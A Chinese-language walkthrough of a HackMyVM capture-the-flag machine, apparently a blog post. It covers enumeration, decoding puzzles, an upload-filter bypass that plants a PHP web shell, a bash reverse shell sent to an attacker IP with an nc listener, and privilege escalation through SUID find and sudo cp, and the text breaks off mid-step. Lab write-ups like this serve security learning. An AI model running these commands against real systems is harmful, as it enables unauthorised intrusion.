<span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">=</span></code></pre>
<p>目录也很少，先去robots看一下<br><a href="https://img.tg/image/OpiNJL"><img src="https://ooo.0x0.ooo/2024/04/21/OpiNJL.png" alt="OpiNJL.png" loading="lazy"></a></p>
<blockquote>
<p>hi.html</p>
</blockquote>
<p><a href="https://img.tg/image/Opieli"><img src="https://ooo.0x0.ooo/2024/04/21/Opieli.png" alt="Opieli.png" loading="lazy"></a><br>给了一个人名<code>Elohim</code></p>
<blockquote>
<p>hackme</p>
</blockquote>
<p><a href="https://img.tg/image/OpiKZt"><img src="https://ooo.0x0.ooo/2024/04/21/OpiKZt.png" alt="OpiKZt.png" loading="lazy"></a><br>404……</p>
<blockquote>
<p>investigate</p>
</blockquote>
<p><a href="https://img.tg/image/OpiABX"><img src="https://ooo.0x0.ooo/2024/04/21/OpiABX.png" alt="OpiABX.png" loading="lazy"></a><br>只有这个目录能利用了</p>
<blockquote>
<p>In Greek mythology, Talos was a giant automaton made of bronze which protected Europa in Crete from pirates and invaders.<br>He was known to be a gift given to Europa by Zeus himself. </p>
</blockquote>
<p>看下源码<br><a href="https://img.tg/image/Opig7p"><img src="https://ooo.0x0.ooo/2024/04/21/Opig7p.png" alt="Opig7p.png" loading="lazy"></a><br><em><!-- If you like research, I will try to help you to solve the enigmas, try to search for documents in this directory --></em><br>提示我们扫描目录,那就继续扫</p>
<pre class="language-bash" data-language="bash"><code class="language-bash">┌──<span class="token punctuation">(</span>root㉿kali2<span class="token punctuation">)</span>-<span class="token punctuation">[</span>~/Desktop<span class="token punctuation">]</span>
└─<span class="token comment"># gobuster dir -u http://192.168.56.158/investigate/ -x html,txt,php,bak,zip --wordlist=/usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt</span>
<span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">=</span>
Gobuster v3.6
by OJ Reeves <span class="token punctuation">(</span>@TheColonial<span class="token punctuation">)</span> <span class="token operator">&amp;</span> Christian Mehlmauer <span class="token punctuation">(</span>@firefart<span class="token punctuation">)</span>
<span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">=</span>
<span class="token punctuation">[</span>+<span class="token punctuation">]</span> Url:                     http://192.168.56.158/investigate/
<span class="token punctuation">[</span>+<span class="token punctuation">]</span> Method:                  GET
<span class="token punctuation">[</span>+<span class="token punctuation">]</span> Threads:                 <span class="token number">10</span>
<span class="token punctuation">[</span>+<span class="token punctuation">]</span> Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
<span class="token punctuation">[</span>+<span class="token punctuation">]</span> Negative Status codes:   <span class="token number">404</span>
<span class="token punctuation">[</span>+<span class="token punctuation">]</span> User Agent:              gobuster/3.6
<span class="token punctuation">[</span>+<span class="token punctuation">]</span> Extensions:              bak,zip,html,txt,php
<span class="token punctuation">[</span>+<span class="token punctuation">]</span> Timeout:                 10s
<span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">=</span>
Starting gobuster <span class="token keyword">in</span> directory enumeration mode
<span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">=</span>
/index.html           <span class="token punctuation">(</span>Status: <span class="token number">200</span><span class="token punctuation">)</span> <span class="token punctuation">[</span>Size: <span class="token number">812</span><span class="token punctuation">]</span>
/rainbow_mystery.txt  <span class="token punctuation">(</span>Status: <span class="token number">200</span><span class="token punctuation">)</span> <span class="token punctuation">[</span>Size: <span class="token number">596</span><span class="token punctuation">]</span>
Progress: <span class="token number">1323360</span> / <span class="token number">1323366</span> <span class="token punctuation">(</span><span class="token number">100.00</span>%<span class="token punctuation">)</span>
<span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">=</span>
Finished
<span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">=</span></code></pre>
<p>果然有发现<code>rainbow_mystery.txt </code><br><a href="https://img.tg/image/OpimLU"><img src="https://ooo.0x0.ooo/2024/04/21/OpimLU.png" alt="OpimLU.png" loading="lazy"></a></p>
<blockquote>
<p>QWNjb3JkaW5nIHRvIHRoZSBPbGQgVGVzdGFtZW50LCB0aGUgcmFpbmJvdyB3YXMgY3JlYXRlZCBi<br>eSBHb2QgYWZ0ZXIgdGhlIHVuaXZlcnNhbCBGbG9vZC4gSW4gdGhlIGJpYmxpY2FsIGFjY291bnQs<br>IGl0IHdvdWxkIGFwcGVhciBhcyBhIHNpZ24gb2YgdGhlIGRpdmluZSB3aWxsIGFuZCB0byByZW1p<br>bmQgbWVuIG9mIHRoZSBwcm9taXNlIG1hZGUgYnkgR29kIGhpbXNlbGYgdG8gTm9haCB0aGF0IGhl<br>IHdvdWxkIG5ldmVyIGFnYWluIGRlc3Ryb3kgdGhlIGVhcnRoIHdpdGggYSBmbG9vZC4KTWF5YmUg<br>dGhhdCdzIHdoeSBJIGFtIGEgcm9ib3Q&#x2F;Ck1heWJlIHRoYXQgaXMgd2h5IEkgYW0gYWxvbmUgaW4g<br>dGhpcyB3b3JsZD8KClRoZSBhbnN3ZXIgaXMgaGVyZToKLS4uIC0tLSAtLSAuLSAuLiAtLiAvIC0g<br>Li4uLi0gLi0uLiAtLS0tLSAuLi4gLi0uLS4tIC4uLi4gLS0gLi4uLQo&#x3D;</p>
</blockquote>
<p>一眼base64，解码一下<br><a href="https://img.tg/image/OpiPzv"><img src="https://ooo.0x0.ooo/2024/04/21/OpiPzv.png" alt="OpiPzv.png" loading="lazy"></a></p>
<blockquote>
<p>According to the Old Testament, the rainbow was created by God after the universal Flood. In the biblical account, it would appear as a sign of the divine will and to remind men of the promise made by<br>God himself to Noah that he would never again destroy the earth with a flood.<br>Maybe that’s why I am a robot?<br>Maybe that is why I am alone in this world?</p>
<p>The answer is here:<br>-.. — – .- .. -. &#x2F; - ….- .-.. —– … .-.-.- …. – …-</p>
</blockquote>
<p>最后一行一看就是摩斯密码，解码得到<code>DOMAINT4L0S.HMV</code>,像是一个域名<br>去掉前面的domain 域名应该是<code>t4l0s.hmv</code>，添加到hosts<br><a href="https://img.tg/image/OpiDTr"><img src="https://ooo.0x0.ooo/2024/04/21/OpiDTr.png" alt="OpiDTr.png" loading="lazy"></a><br>看源码<br><a href="https://img.tg/image/OpiHvM"><img src="https://ooo.0x0.ooo/2024/04/21/OpiHvM.png" alt="OpiHvM.png" loading="lazy"></a><br>让我们找到Elohim，那就扫一下子域</p>
<h3 id="子域扫描"><a href="#子域扫描" class="headerlink" title="子域扫描"></a>子域扫描</h3><pre class="language-bash" data-language="bash"><code class="language-bash">┌──<span class="token punctuation">(</span>root㉿kali2<span class="token punctuation">)</span>-<span class="token punctuation">[</span>~/Desktop<span class="token punctuation">]</span>
└─<span class="token comment"># ffuf -u http://t4l0s.hmv -H 'Host: FUZZ.t4l0s.hmv' -w /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-110000.txt -fs 615</span>

        /<span class="token string">'___\  /'</span>___<span class="token punctuation">\</span>           /'___<span class="token punctuation">\</span>       
       /<span class="token punctuation">\</span> <span class="token punctuation">\</span>__/ /<span class="token punctuation">\</span> <span class="token punctuation">\</span>__/  __  __  /<span class="token punctuation">\</span> <span class="token punctuation">\</span>__/       
       <span class="token punctuation">\</span> <span class="token punctuation">\</span> ,__<span class="token punctuation">\</span><span class="token punctuation">\</span> <span class="token punctuation">\</span> ,__<span class="token punctuation">\</span>/<span class="token punctuation">\</span> <span class="token punctuation">\</span>/<span class="token punctuation">\</span> <span class="token punctuation">\</span> <span class="token punctuation">\</span> <span class="token punctuation">\</span> ,__<span class="token punctuation">\</span>      
        <span class="token punctuation">\</span> <span class="token punctuation">\</span> <span class="token punctuation">\</span>_/ <span class="token punctuation">\</span> <span class="token punctuation">\</span> <span class="token punctuation">\</span>_/<span class="token punctuation">\</span> <span class="token punctuation">\</span> <span class="token punctuation">\</span>_<span class="token punctuation">\</span> <span class="token punctuation">\</span> <span class="token punctuation">\</span> <span class="token punctuation">\</span> <span class="token punctuation">\</span>_/      
         <span class="token punctuation">\</span> <span class="token punctuation">\</span>_<span class="token punctuation">\</span>   <span class="token punctuation">\</span> <span class="token punctuation">\</span>_<span class="token punctuation">\</span>  <span class="token punctuation">\</span> <span class="token punctuation">\</span>____/  <span class="token punctuation">\</span> <span class="token punctuation">\</span>_<span class="token punctuation">\</span>       
          <span class="token punctuation">\</span>/_/    <span class="token punctuation">\</span>/_/   <span class="token punctuation">\</span>/___/    <span class="token punctuation">\</span>/_/       

       v2.1.0-dev
________________________________________________

 :: Method           <span class="token builtin class-name">:</span> GET
 :: URL              <span class="token builtin class-name">:</span> http://t4l0s.hmv
 :: Wordlist         <span class="token builtin class-name">:</span> FUZZ: /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-110000.txt
 :: Header           <span class="token builtin class-name">:</span> Host: FUZZ.t4l0s.hmv
 :: Follow redirects <span class="token builtin class-name">:</span> <span class="token boolean">false</span>
 :: Calibration      <span class="token builtin class-name">:</span> <span class="token boolean">false</span>
 :: Timeout          <span class="token builtin class-name">:</span> <span class="token number">10</span>
 :: Threads          <span class="token builtin class-name">:</span> <span class="token number">40</span>
 :: Matcher          <span class="token builtin class-name">:</span> Response status: <span class="token number">200</span>-299,301,302,307,401,403,405,500
 :: Filter           <span class="token builtin class-name">:</span> Response size: <span class="token number">615</span>
________________________________________________

hellfire                <span class="token punctuation">[</span>Status: <span class="token number">200</span>, Size: <span class="token number">1659</span>, Words: <span class="token number">688</span>, Lines: <span class="token number">52</span>, Duration: 2ms<span class="token punctuation">]</span>
:: Progress: <span class="token punctuation">[</span><span class="token number">114441</span>/114441<span class="token punctuation">]</span> :: Job <span class="token punctuation">[</span><span class="token number">1</span>/1<span class="token punctuation">]</span> :: <span class="token number">7142</span> req/sec :: Duration: <span class="token punctuation">[</span><span class="token number">0</span>:00:12<span class="token punctuation">]</span> :: Errors: <span class="token number">0</span> ::</code></pre>
<p>扫出来一个子域hellfire.t4l0s.hmv,添加到hosts<br><a href="https://img.tg/image/OpiQ7I"><img src="https://ooo.0x0.ooo/2024/04/21/OpiQ7I.png" alt="OpiQ7I.png" loading="lazy"></a><br><a href="https://img.tg/image/OpiSLD"><img src="https://ooo.0x0.ooo/2024/04/21/OpiSLD.png" alt="OpiSLD.png" loading="lazy"></a><br>还挺有意思的，找对了，那就扫一下这个子域有什么目录</p>
<pre class="language-bash" data-language="bash"><code class="language-bash">                                                                                                                                                                                                                                                     
┌──<span class="token punctuation">(</span>root㉿kali2<span class="token punctuation">)</span>-<span class="token punctuation">[</span>~/Desktop<span class="token punctuation">]</span>
└─<span class="token comment"># gobuster dir -u http://hellfire.t4l0s.hmv/ -x html,txt,php,bak,zip --wordlist=/usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt</span>
<span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">=</span>
Gobuster v3.6
by OJ Reeves <span class="token punctuation">(</span>@TheColonial<span class="token punctuation">)</span> <span class="token operator">&amp;</span> Christian Mehlmauer <span class="token punctuation">(</span>@firefart<span class="token punctuation">)</span>
<span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">=</span>
<span class="token punctuation">[</span>+<span class="token punctuation">]</span> Url:                     http://hellfire.t4l0s.hmv/
<span class="token punctuation">[</span>+<span class="token punctuation">]</span> Method:                  GET
<span class="token punctuation">[</span>+<span class="token punctuation">]</span> Threads:                 <span class="token number">10</span>
<span class="token punctuation">[</span>+<span class="token punctuation">]</span> Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
<span class="token punctuation">[</span>+<span class="token punctuation">]</span> Negative Status codes:   <span class="token number">404</span>
<span class="token punctuation">[</span>+<span class="token punctuation">]</span> User Agent:              gobuster/3.6
<span class="token punctuation">[</span>+<span class="token punctuation">]</span> Extensions:              html,txt,php,bak,zip
<span class="token punctuation">[</span>+<span class="token punctuation">]</span> Timeout:                 10s
<span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">=</span>
Starting gobuster <span class="token keyword">in</span> directory enumeration mode
<span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">=</span>
/index.php            <span class="token punctuation">(</span>Status: <span class="token number">200</span><span class="token punctuation">)</span> <span class="token punctuation">[</span>Size: <span class="token number">1659</span><span class="token punctuation">]</span>
/upload.php           <span class="token punctuation">(</span>Status: <span class="token number">200</span><span class="token punctuation">)</span> <span class="token punctuation">[</span>Size: <span class="token number">748</span><span class="token punctuation">]</span>
/output.php           <span class="token punctuation">(</span>Status: <span class="token number">200</span><span class="token punctuation">)</span> <span class="token punctuation">[</span>Size: <span class="token number">1350</span><span class="token punctuation">]</span>
/archivos             <span class="token punctuation">(</span>Status: <span class="token number">301</span><span class="token punctuation">)</span> <span class="token punctuation">[</span>Size: <span class="token number">169</span><span class="token punctuation">]</span> <span class="token punctuation">[</span>--<span class="token operator">></span> http://hellfire.t4l0s.hmv/archivos/<span class="token punctuation">]</span>
Progress: <span class="token number">559052</span> / <span class="token number">1323366</span> <span class="token punctuation">(</span><span class="token number">42.24</span>%<span class="token punctuation">)</span>^C
<span class="token punctuation">[</span><span class="token operator">!</span><span class="token punctuation">]</span> Keyboard interrupt detected, terminating.
Progress: <span class="token number">561517</span> / <span class="token number">1323366</span> <span class="token punctuation">(</span><span class="token number">42.43</span>%<span class="token punctuation">)</span>
<span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">=</span>
Finished
<span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">=</span></code></pre>
<p>有文件上传，那好办了</p>
<h2 id="getshell"><a href="#getshell" class="headerlink" title="getshell"></a>getshell</h2><p><a href="https://img.tg/image/Opi0uF"><img src="https://ooo.0x0.ooo/2024/04/21/Opi0uF.png" alt="Opi0uF.png" loading="lazy"></a><br><a href="https://img.tg/image/Opidz6"><img src="https://ooo.0x0.ooo/2024/04/21/Opidz6.png" alt="Opidz6.png" loading="lazy"></a><br>只能上传图片<br><a href="https://img.tg/image/OpisPP"><img src="https://ooo.0x0.ooo/2024/04/21/OpisPP.png" alt="OpisPP.png" loading="lazy"></a><br>改成image&#x2F;png成功上传并给出了目录<code>archivos/shell.php</code><br>成功rce<br><a href="https://img.tg/image/OpifTl"><img src="https://ooo.0x0.ooo/2024/04/21/OpifTl.png" alt="OpifTl.png" loading="lazy"></a><br>反弹个shell到kali</p>
<blockquote>
<p><a href="http://hellfire.t4l0s.hmv/archivos/shell.php?1=bash%20-c%20%27bash%20-i%20%3E&%20/dev/tcp/192.168.56.104/4567%20%200%3E&1%27">http://hellfire.t4l0s.hmv/archivos/shell.php?1=bash%20-c%20%27bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F192.168.56.104%2F4567%20%200%3E%261%27</a></p>
</blockquote>
<pre class="language-bash" data-language="bash"><code class="language-bash">┌──<span class="token punctuation">(</span>root㉿kali2<span class="token punctuation">)</span>-<span class="token punctuation">[</span>~/Desktop<span class="token punctuation">]</span>
└─<span class="token comment"># nc -lvnp 4567</span>
listening on <span class="token punctuation">[</span>any<span class="token punctuation">]</span> <span class="token number">4567</span> <span class="token punctuation">..</span>.
connect to <span class="token punctuation">[</span><span class="token number">192.168</span>.56.104<span class="token punctuation">]</span> from <span class="token punctuation">(</span>UNKNOWN<span class="token punctuation">)</span> <span class="token punctuation">[</span><span class="token number">192.168</span>.56.158<span class="token punctuation">]</span> <span class="token number">40150</span>
bash: cannot <span class="token builtin class-name">set</span> terminal process group <span class="token punctuation">(</span><span class="token number">538</span><span class="token punctuation">)</span>: Inappropriate ioctl <span class="token keyword">for</span> device
bash: no job control <span class="token keyword">in</span> this shell
www-data@principle:~/hellfire.t4l0s.hmv/archivos$ </code></pre>
<h2 id="提权user"><a href="#提权user" class="headerlink" title="提权user"></a>提权user</h2><p><strong>sudo</strong></p>
<pre class="language-bash" data-language="bash"><code class="language-bash">www-data@principle:~$ <span class="token function">sudo</span> <span class="token parameter variable">-l</span> 
<span class="token punctuation">[</span>sudo<span class="token punctuation">]</span> password <span class="token keyword">for</span> www-data: </code></pre>
<p>无果<br><strong>suid</strong></p>
<pre class="language-bash" data-language="bash"><code class="language-bash">www-data@principle:~$ <span class="token function">find</span> / <span class="token parameter variable">-perm</span> <span class="token parameter variable">-4000</span> <span class="token operator"><span class="token file-descriptor important">2</span>></span>/dev/null
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/lib/openssh/ssh-keysign
/usr/bin/chfn
/usr/bin/gpasswd
/usr/bin/mount
/usr/bin/passwd
/usr/bin/sudo
/usr/bin/find
/usr/bin/su
/usr/bin/chsh
/usr/bin/umount
/usr/bin/newgrp</code></pre>
<p>有个find可以提权</p>
<pre class="language-bash" data-language="bash"><code class="language-bash">www-data@principle:~$ <span class="token function">find</span> <span class="token builtin class-name">.</span> <span class="token parameter variable">-exec</span> /bin/sh <span class="token parameter variable">-p</span> <span class="token punctuation">\</span><span class="token punctuation">;</span> <span class="token parameter variable">-quit</span>
$ <span class="token function">id</span>
<span class="token assign-left variable">uid</span><span class="token operator">=</span><span class="token number">33</span><span class="token punctuation">(</span>www-data<span class="token punctuation">)</span> <span class="token assign-left variable">gid</span><span class="token operator">=</span><span class="token number">33</span><span class="token punctuation">(</span>www-data<span class="token punctuation">)</span> <span class="token assign-left variable">euid</span><span class="token operator">=</span><span class="token number">1000</span><span class="token punctuation">(</span>talos<span class="token punctuation">)</span> <span class="token assign-left variable">groups</span><span class="token operator">=</span><span class="token number">33</span><span class="token punctuation">(</span>www-data<span class="token punctuation">)</span>
$ <span class="token function">whoami</span>
talos</code></pre>
<p>拿到talos的uid权限</p>
<pre class="language-bash" data-language="bash"><code class="language-bash">$ <span class="token function">ls</span> <span class="token parameter variable">-al</span>
total <span class="token number">40</span>
drwxr-xr-x <span class="token number">4</span> talos talos <span class="token number">4096</span> Jul <span class="token number">14</span>  <span class="token number">2023</span> <span class="token builtin class-name">.</span>
drwxr-xr-x <span class="token number">4</span> root  root  <span class="token number">4096</span> Jul  <span class="token number">4</span>  <span class="token number">2023</span> <span class="token punctuation">..</span>
-rw-r--r-- <span class="token number">1</span> talos talos    <span class="token number">1</span> Jul <span class="token number">14</span>  <span class="token number">2023</span> .bash_history
-rw-r----- <span class="token number">1</span> talos talos  <span class="token number">261</span> Jul  <span class="token number">5</span>  <span class="token number">2023</span> .bash_logout
-rw-r----- <span class="token number">1</span> talos talos <span class="token number">3545</span> Jul <span class="token number">14</span>  <span class="token number">2023</span> .bashrc
-rw------- <span class="token number">1</span> talos talos   <span class="token number">20</span> Jul  <span class="token number">4</span>  <span class="token number">2023</span> .lesshst
drw-r----- <span class="token number">3</span> talos talos <span class="token number">4096</span> Jun <span class="token number">30</span>  <span class="token number">2023</span> .local
-rw-r----- <span class="token number">1</span> talos talos  <span class="token number">807</span> Jun <span class="token number">30</span>  <span class="token number">2023</span> .profile
drwx------ <span class="token number">2</span> talos talos <span class="token number">4096</span> Jul <span class="token number">14</span>  <span class="token number">2023</span> .ssh
-rw-r----- <span class="token number">1</span> talos talos  <span class="token number">320</span> Jul <span class="token number">13</span>  <span class="token number">2023</span> note.txt
$ <span class="token function">cat</span> note.txt
Congratulations<span class="token operator">!</span> You have made it this far thanks to the manipulated <span class="token function">file</span> I left you, I knew you would <span class="token function">make</span> it<span class="token operator">!</span>
Now we are very close to finding this <span class="token boolean">false</span> God Elohim.
I left you a <span class="token function">file</span> with the name of one of the <span class="token number">12</span> Gods of Olympus, out of the eye of Elohim <span class="token punctuation">;</span><span class="token punctuation">)</span>
The tool I left you is still your ally. Good luck to you.</code></pre>
<p>talos目录下面有个note.txt</p>
<blockquote>
<p>祝贺多亏了我留给你的被操纵的文件，你才走到今天，我知道你会成功的！<br>现在我们很快就要找到这个虚假的上帝伊洛欣了。<br>我给你留下了一份档案，上面写着奥林匹斯十二神之一的名字，是埃洛希姆无意中留下的；）<br>我留给你的工具仍然是你的盟友。祝你好运。</p>
</blockquote>
<p>应该有有个文件是奥利匹斯十二神的名字<br>十二神<br><code>Afrodita, Apolo, Zeus, Hera, Poseidon, Ares, Atenea, Hermes, Artemisa, Hefesto, Demeter, Hestia</code><br>在Afrodita搜到了</p>
<pre class="language-bash" data-language="bash"><code class="language-bash">$ <span class="token function">find</span> / <span class="token parameter variable">-name</span> *Afrodita* <span class="token operator"><span class="token file-descriptor important">2</span>></span>/dev/null
/etc/selinux/Afrodita.key
$ <span class="token function">cat</span> /etc/selinux/A*
Here is my password:
Hax0rModeON

Now I have <span class="token keyword">done</span> another little trick to <span class="token builtin class-name">help</span> you reach Elohim.
REMEMBER: You need the access key and <span class="token function">open</span> the door. Anyway, he has a bad memory and that's why he keeps the lock coded and hidden at home.</code></pre>
<p>拿到了talos的密码<code>Hax0rModeON</code></p>
<pre class="language-bash" data-language="bash"><code class="language-bash">talos@principle:/home$ <span class="token function">sudo</span> <span class="token parameter variable">-l</span>
Matching Defaults entries <span class="token keyword">for</span> talos on principle:
    env_reset, mail_badpass,
    <span class="token assign-left variable">secure_path</span><span class="token operator">=</span>/usr/local/sbin<span class="token punctuation">\</span>:/usr/local/bin<span class="token punctuation">\</span>:/usr/sbin<span class="token punctuation">\</span>:/usr/bin<span class="token punctuation">\</span>:/sbin<span class="token punctuation">\</span>:/bin,
    use_pty

User talos may run the following commands on principle:
    <span class="token punctuation">(</span>elohim<span class="token punctuation">)</span> NOPASSWD: /bin/cp</code></pre>
<p>&#x2F;bin&#x2F;cp可以以elohim用户免密执行<br>那么就可以将gehenna的ssh私钥搞到手<br>由于ssh服务对外没有开放端口，在内看一下</p>
